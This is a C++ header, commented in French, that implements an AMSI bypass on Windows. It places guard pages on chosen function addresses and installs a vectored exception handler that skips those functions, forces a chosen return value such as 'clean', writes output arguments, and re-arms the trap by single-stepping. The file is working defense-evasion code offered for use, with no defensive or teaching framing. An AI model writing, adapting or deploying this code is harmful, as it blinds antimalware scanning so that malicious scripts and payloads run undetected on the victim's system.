#pragma once
#include <windows.h>

// ========== DÉFINITIONS AMSI ==========
using HAMSICONTEXT = PVOID;
using HAMSISESSION = PVOID;
using AMSI_RESULT = ULONG;
static constexpr AMSI_RESULT kAmsiResultClean = 0;

// ========== STRUCTURE BYPASS ==========
struct BypassTarget
{
    PVOID     addr;           // adresse de la fonction
    ULONG_PTR retVal;         // valeur de retour (RAX)
    int       outArgIdx;      // index du paramètre de sortie (-1 = aucun)
    ULONG_PTR outArgVal;      // valeur à écrire dans *stack[outArgIdx]
    int       outArgSize;     // taille d'écriture: 4 = DWORD, 8 = ULONG_PTR
};

// ========== ÉTAT ==========
static constexpr int kMaxTargets = 8;

static BypassTarget           g_Targets[kMaxTargets] = {};
static int                    g_TargetCount = 0;
static PVOID                  g_VehHandle   = nullptr;
static thread_local bool      g_StepPending = false;

// ========== HELPERS ==========
static inline PVOID PageOf(PVOID addr)
{
    return reinterpret_cast<PVOID>(
        reinterpret_cast<ULONG_PTR>(addr) & ~static_cast<ULONG_PTR>(0xFFF));
}

static void ReprotectAll()
{
    for (int i = 0; i < g_TargetCount; ++i)
    {
        bool duplicate = false;
        for (int j = 0; j < i; ++j)
        {
            if (PageOf(g_Targets[j].addr) == PageOf(g_Targets[i].addr))
            {
                duplicate = true;
                break;
            }
        }
        if (!duplicate)
        {
            DWORD old = 0;
            VirtualProtect(g_Targets[i].addr, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
        }
    }
}

// ========== VECTEURED EXCEPTION HANDLER ==========
static LONG NTAPI VehHandler(PEXCEPTION_POINTERS ei)
{
    const DWORD code = ei->ExceptionRecord->ExceptionCode;
    PCONTEXT    ctx  = ei->ContextRecord;

    if (code == STATUS_GUARD_PAGE_VIOLATION)
    {
        PVOID fault = ei->ExceptionRecord->ExceptionAddress;

        for (int i = 0; i < g_TargetCount; ++i)
        {
            if (fault != g_Targets[i].addr)
                continue;

            const BypassTarget& t = g_Targets[i];
            auto* stack = reinterpret_cast<ULONG_PTR*>(ctx->Rsp);

            if (t.outArgIdx >= 0)
            {
                PVOID outPtr = reinterpret_cast<PVOID>(stack[t.outArgIdx]);
                if (outPtr)
                {
                    if (t.outArgSize <= 4)
                        *reinterpret_cast<DWORD*>(outPtr) = static_cast<DWORD>(t.outArgVal);
                    else
                        *reinterpret_cast<ULONG_PTR*>(outPtr) = t.outArgVal;
                }
            }

            ctx->Rip  = stack[0];
            ctx->Rsp += sizeof(ULONG_PTR);
            ctx->Rax  = t.retVal;

            ctx->EFlags |= 0x100; // TF
            g_StepPending = true;
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        // Non-target function on guarded page
        ctx->EFlags |= 0x100;
        g_StepPending = true;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (code == STATUS_SINGLE_STEP && g_StepPending)
    {
        g_StepPending = false;
        ReprotectAll();
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// ========== API PUBLIQUE ==========
static BOOL AddBypassTarget(PVOID addr, ULONG_PTR retVal,
                             int outArgIdx = -1, ULONG_PTR outArgVal = 0,
                             int outArgSize = 4)
{
    if (g_TargetCount >= kMaxTargets)
        return FALSE;

    g_Targets[g_TargetCount++] = { addr, retVal, outArgIdx, outArgVal, outArgSize };
    return TRUE;
}

static BOOL InstallBypass()
{
    if (g_TargetCount == 0)
        return FALSE;

    g_VehHandle = AddVectoredExceptionHandler(1, VehHandler);
    if (!g_VehHandle)
        return FALSE;

    ReprotectAll();
    return TRUE;
}

static void UninstallBypass()
{
    if (!g_VehHandle) return;

    for (int i = 0; i < g_TargetCount; ++i)
    {
        DWORD old = 0;
        VirtualProtect(g_Targets[i].addr, 1, PAGE_EXECUTE_READ, &old);
    }

    RemoveVectoredExceptionHandler(g_VehHandle);
    g_VehHandle   = nullptr;
    g_TargetCount = 0;
}
